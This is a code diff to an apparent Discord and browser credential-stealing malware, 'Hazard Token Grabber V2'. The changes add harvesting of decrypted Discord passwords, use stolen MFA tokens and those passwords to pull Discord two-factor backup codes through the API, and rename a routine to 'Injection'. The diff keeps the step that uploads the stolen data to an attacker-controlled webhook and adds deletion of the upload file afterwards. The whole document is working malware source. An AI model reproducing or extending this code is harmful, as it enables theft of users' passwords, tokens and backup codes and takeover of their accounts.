@@ -26,6 +26,8 @@ class Hazard_Token_Grabber_V2:
             pass
 
         self.tokens = []
+        self.discord_psw = []
+        self.backup_codes = []
 
         if os.path.exists(self.roaming+"\\BetterDiscord"):
             self.bypass_better_discord()
@@ -37,7 +39,7 @@ class Hazard_Token_Grabber_V2:
             self.grabCookies()
         self.grabTokens()
         self.screenshot()
-        for i in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt"]:
+        for i in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt", "Discord backupCodes.txt"]:
             if os.path.exists(self.tempfolder+os.sep+i):
                 with open(self.tempfolder+os.sep+i, "r", encoding="cp437") as f:
                     x = f.read()
@@ -46,7 +48,7 @@ class Hazard_Token_Grabber_V2:
                             f.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
                         with open(self.tempfolder+os.sep+i, "a", encoding="cp437") as fp:
                             fp.write(x)
-                            fp.write("Made by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")
+                            fp.write("\n\nMade by Rdimo | https://github.com/Rdimo/Hazard-Token-Grabber-V2")
                     else:
                         f.close()
                         try:
@@ -55,7 +57,7 @@ class Hazard_Token_Grabber_V2:
                             print("ok")
 
         self.SendInfo()
-        self.LogOut()
+        self.Injection()
         try:
             shutil.rmtree(self.tempfolder)
         except (PermissionError, FileNotFoundError):
@@ -70,7 +72,7 @@ class Hazard_Token_Grabber_V2:
             headers.update({"Authorization": token})
         return headers
 
-    def LogOut(self):
+    def Injection(self):
         for proc in psutil.process_iter():
             if any(procstr in proc.name().lower() for procstr in\
             ['discord', 'discordcanary', 'discorddevelopment', 'discordptb']):
@@ -146,6 +148,8 @@ class Hazard_Token_Grabber_V2:
                     decrypted_password = self.decrypt_password(encrypted_password, master_key)
                     if url != "":
                         f.write(f"Domain: {url}\nUser: {username}\nPass: {decrypted_password}\n\n")
+                        if "discord" in url.lower():
+                            self.discord_psw.append(decrypted_password)
             except:
                 pass
         cursor.close()
@@ -220,11 +224,27 @@ class Hazard_Token_Grabber_V2:
                     for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
                         for token in findall(regex, line):
                             r = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token))
+                            j = r.json()
                             if r.status_code == 200:
                                 if token in self.tokens:
                                     continue
                                 self.tokens.append(token)
-                                j = requests.get("https://discord.com/api/v9/users/@me", headers=self.getheaders(token)).json()
+
+                                user = j["username"] + "#" + str(j["discriminator"])
+
+                                if token.startswith("mfa."):
+                                    with open(self.tempfolder+os.sep+"Discord backupCodes.txt", "a") as fp:
+                                        fp.write(f"{user} Backup Codes".center(36, "-")+"\n")
+                                        for x in self.discord_psw:
+                                            try:
+                                                r = requests.post("https://discord.com/api/v9/users/@me/mfa/codes", headers=self.getheaders(token), json={"password": x, "regenerate": False}).json()
+                                                for i in r["backup_codes"]:
+                                                    if i not in self.backup_codes:
+                                                        self.backup_codes.append(i)
+                                                        fp.write(f'\t{i["code"]} | {"Already used" if i["consumed"] == True else "Not used"}\n')
+                                            except Exception:
+                                                pass
+
                                 badges = ""
                                 flags = j['flags']
                                 if (flags == 1):
@@ -317,6 +337,7 @@ class Hazard_Token_Grabber_V2:
         }
         requests.post(self.webhook, json=embed)
         requests.post(self.webhook, files={'upload_file': open(new,'rb')})
+        os.remove(new)
 
     def zip(self, src, dst):
         zipped_file = zipfile.ZipFile(dst, "w", zipfile.ZIP_DEFLATED)
